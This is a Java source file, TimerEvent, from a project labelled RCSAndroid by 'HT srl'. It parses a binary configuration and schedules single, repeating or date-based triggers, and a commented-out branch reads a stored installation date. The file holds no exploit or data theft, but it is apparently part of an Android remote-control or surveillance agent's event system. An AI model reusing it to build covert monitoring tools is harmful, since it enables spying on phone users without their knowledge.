/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.event;

import java.io.IOException;
import java.util.Date;

import android.util.Log;

import com.ht.RCSAndroidGUI.Debug;
import com.ht.RCSAndroidGUI.utils.DataBuffer;

// TODO: Auto-generated Javadoc
/**
 * The Class TimerEvent.
 */
public class TimerEvent extends EventBase {

	/** The Constant SLEEP_TIME. */
	private static final int SLEEP_TIME = 1000;

	// #ifdef DEBUG
	/** The debug. */
	private static Debug debug = new Debug("TimerEvent");
	// #endif

	/** The Constant CONF_TIMER_SINGLE. */
	final private static int CONF_TIMER_SINGLE = 0;

	/** The Constant CONF_TIMER_REPEAT. */
	final private static int CONF_TIMER_REPEAT = 1;

	/** The Constant CONF_TIMER_DATE. */
	final private static int CONF_TIMER_DATE = 2;

	/** The Constant TAG. */
	private static final String TAG = Class.class.getName();

	/** The type. */
	private int type;

	/** The lo delay. */
	long loDelay;

	/** The hi delay. */
	long hiDelay;

	/**
	 * Instantiates a new timer event.
	 */
	public TimerEvent() {
		Log.d("RCS", "TimerEvent constructor");
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see
	 * com.ht.RCSAndroidGUI.event.EventBase#parse(com.ht.RCSAndroidGUI.event
	 * .Event)
	 */
	@Override
	public void parse(final EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		try {
			type = databuffer.readInt();
			loDelay = databuffer.readInt();
			hiDelay = databuffer.readInt();

			// #ifdef DEBUG
			debug.trace("type: " + type + " lo:" + loDelay + " hi:" + hiDelay);
			// #endif

		} catch (final IOException e) {
			// #ifdef DEBUG
			debug.error("params FAILED");
			// #endif

		}

	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.event.EventBase#begin()
	 */
	@Override
	public void begin() {
		final long now = System.currentTimeMillis();

		switch (type) {
		case CONF_TIMER_SINGLE:
			// #ifdef DEBUG
			debug.info("TIMER_SINGLE delay: " + loDelay);
			// #endif
			setDelay(loDelay);
			setPeriod(NEVER);
			break;
		case CONF_TIMER_REPEAT:
			// #ifdef DEBUG
			debug.info("TIMER_REPEAT period: " + loDelay);
			// #endif
			// TODO: decidere se lasciarlo a 1000 o a loDelay
			setDelay(1000);
			setPeriod(loDelay);
			break;
		case CONF_TIMER_DATE:
			long tmpTime = hiDelay << 32;
			tmpTime += loDelay;
			// #ifdef DEBUG
			final Date date = new Date(tmpTime);
			debug.info("TIMER_DATE: " + date);
			// #endif

			setPeriod(NEVER);
			setDelay(tmpTime - now);
			break;
		/*
		 * case CONF_TIMER_DELTA: // #ifdef DEBUG debug.info("TIMER_DELTA"); //
		 * #endif
		 * 
		 * long deltaTime = hiDelay << 32; deltaTime += loDelay;
		 * 
		 * // se la data di installazione non c'e' si crea. if
		 * (!markup.isMarkup()) { final Date instTime =
		 * Status.getInstance().getStartingDate();
		 * markup.writeMarkup(Utils.longToByteArray(instTime.getTime())); }
		 * 
		 * // si legge la data di installazione dal markup try { final long
		 * timeInst = Utils.byteArrayToLong( markup.readMarkup(), 0);
		 * 
		 * setPeriod(NEVER); final long delay = timeInst + deltaTime - now; if
		 * (delay > 0) { setDelay(timeInst + deltaTime - now); } else { //
		 * #ifdef DEBUG debug.info("negative delta"); // #endif } // #ifdef
		 * DEBUG date = new Date(timeInst + deltaTime - now);
		 * debug.info("DELTA_DATE: " + date); // #endif
		 * 
		 * } catch (final IOException e) { // #ifdef ERROR debug.error(e); //
		 * #endif }
		 * 
		 * break;
		 */
		default:
			// #ifdef DEBUG
			debug.error("shouldn't be here");
			// #endif
			break;
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.ThreadBase#go()
	 */
	@Override
	public void go() {
		Log.i(TAG, "triggering");
		trigger();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.event.EventBase#end()
	 */
	@Override
	public void end() {

	}
}
